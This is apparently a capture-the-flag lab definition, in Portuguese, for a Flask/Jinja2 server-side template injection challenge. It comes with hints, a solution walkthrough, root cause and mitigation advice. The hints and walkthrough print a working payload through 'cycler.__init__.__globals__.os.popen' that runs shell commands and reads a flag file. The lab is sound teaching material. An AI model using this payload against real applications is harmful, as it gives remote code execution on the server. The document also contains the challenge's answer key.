@@ -1,0 +1,35 @@
+{
+  "slug": "ssti-card",
+  "title": "Hello, {{ Operator }}",
+  "codename": "GREETING CARD",
+  "summary": "O Greeting Card compila o nome do destinatário como parte de um template Jinja. Confirme a avaliação de template, pivot através do grafo de objetos do Jinja e leia o arquivo de flag do serviço.",
+  "category": "server",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "ssti-card",
+  "estimated_minutes": 28,
+  "xp": 175,
+  "tech": ["Flask", "Jinja2", "Python"],
+  "tags": ["ssti", "template-injection", "rce"],
+  "story": "O estúdio de cartões começou como uma conveniência: a equipe de produto queria saudações dinâmicas sem fazer deploy de código. O renderizador trata o nome do destinatário como código-fonte de template. Uma saudação agora é um programa.",
+  "objective": "Prove a server-side template injection e use-a para ler `/tmp/redvault-ssti-flag.txt`.",
+  "rules": "Mantenha o exploit dentro do processo do lab. Nenhum ataque contra a plataforma ou o host subjacente.",
+  "flags": [
+    {"key": "flag", "label": "Flag de execução de template", "flag_type": "root", "points": 175, "required": true, "requires_objective": true}
+  ],
+  "hints": [
+    {"level": 1, "title": "Avalie uma expressão", "body": "Envie `{{ 7*7 }}` como nome. Se o cartão contiver `49`, a entrada está sendo compilada como template Jinja em vez de exibida como texto.", "cost": 15},
+    {"level": 2, "title": "Alcance o interpretador", "body": "O global `cycler` do Jinja expõe os globals do módulo. Um pivô comum é `{{ cycler.__init__.__globals__.os.popen('id').read() }}`.", "cost": 25},
+    {"level": 3, "title": "Leia o arquivo", "body": "Envie `{{ cycler.__init__.__globals__.os.popen('cat /tmp/redvault-ssti-flag.txt').read() }}`. A saída do cartão contém a flag e o objetivo é marcado.", "cost": 30}
+  ],
+  "solution": {
+    "walkthrough": "1. Envie `{{ 7*7 }}` e confirme que a saída é `49`.\n2. Execute um comando através do grafo de objetos do Jinja:\n```jinja\n{{ cycler.__init__.__globals__.os.popen('cat /tmp/redvault-ssti-flag.txt').read() }}\n```\n3. O cartão renderizado contém a flag. Envie-a.",
+    "root_cause": "Server-side template injection. O nome é interpolado no código-fonte do template e compilado pelo Jinja. A avaliação de expressões expõe internals do Python e, por fim, execução de comandos.",
+    "mitigation": "Nunca compile entrada do usuário como template. Passe valores não confiáveis como variáveis de contexto do template e deixe o autoescaping cuidar da saída. Use um ambiente sandbox se templates dinâmicos forem inevitáveis, minimize os globals expostos e rode a renderização de templates com privilégio mínimo."
+  },
+  "references": [
+    {"title": "PortSwigger — Server-side template injection", "url": "https://portswigger.net/web-security/server-side-template-injection", "source_type": "official", "description": "Detecção, exploração e mitigação de SSTI."},
+    {"title": "OWASP WSTG — Testing for SSTI", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection", "source_type": "standard", "description": "Metodologia de teste de SSTI em diferentes template engines."},
+    {"title": "Jinja2 — Sandboxed Environment", "url": "https://jinja.palletsprojects.com/en/stable/sandbox/", "source_type": "official", "description": "Limites disponíveis para templates não confiáveis; não é uma fronteira de segurança completa."}
+  ]
+}
